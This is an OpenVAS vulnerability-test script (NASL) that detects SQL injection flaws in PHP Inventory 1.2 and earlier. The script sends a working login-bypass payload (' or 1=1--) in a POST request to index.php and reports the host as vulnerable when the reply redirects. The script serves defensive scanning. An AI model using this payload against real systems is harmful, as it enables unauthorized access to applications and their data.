###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_php_inventory_mult_vuln.nasl 14 2013-10-27 12:33:37Z jan $
#
# PHP Inventory Multiple Vulnerabilities
#
# Authors:
# Rachana Shetty <srachana@secpod.com>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow remote attackers to include arbitrary
  HTML or web scripts in the scope of the browser and allows to obtain and
  manipulate sensitive information.
  Impact Level: Application.";
tag_affected = "PHP Inventory version 1.2 and prior.";
tag_insight = "The Multiple flaws due to:
  - Input passed via the 'user_id' parameter to 'index.php' and via the 'sup_id'
    parameter is not properly sanitised before being used in an SQL query.
  - Input passed via the 'user' and 'pass' form field to 'index.php' is not
    properly sanitised before being used in an SQL query.";
tag_solution = "No solution or patch is available as of 22nd January, 2010. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://www.phpwares.com/content/php-inventory";
tag_summary = "This host is running PHP inventory and is prone to multiple
  vulnerabilities.";

if(description)
{
  script_id(800983);
  script_version("$Revision: 14 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:33:37 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2010-01-22 16:43:14 +0100 (Fri, 22 Jan 2010)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"risk_factor", value:"High");
  script_cve_id("CVE-2009-4595", "CVE-2009-4596", "CVE-2009-4597");
  script_name("PHP Inventory Multiple Vulnerabilities");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://secunia.com/advisories/37672");
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/54666");
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/54667");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/10370");

  script_description(desc);
  script_summary("Determine PHP Inventory vulnerabliilty");
  script_category(ACT_MIXED_ATTACK);
  script_copyright("Copyright (c) 2010 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

phpinPort = get_http_port(default:80);
if(!phpinPort){
  exit(0);
}

if(!get_port_state(phpinPort)){
  exit(0);
}

if(safe_checks()){
  exit(0);
}

foreach dir (make_list("/", "/php-inventory", cgi_dirs()))
{
  variables = string("user=%27+or+1%3D1--&pass=%27+or+1%3D1--");
  host = get_host_name();

  req = string("POST /php-inventory/index.php HTTP/1.1\r\n",
               "Host: ", host, "\r\n",
               "Referer: ","http://",host,"/php-inventory/\r\n",
               "Content-Type: application/x-www-form-urlencoded\r\n",
               "Content-Length: ", strlen(variables),
               "\r\n\r\n",
               variables);

  result = http_keepalive_send_recv(port:phpinPort, data:req);
  if("Location: index.php" >< result )
  {
    security_hole(phpinPort);
    exit(0);
  }
}
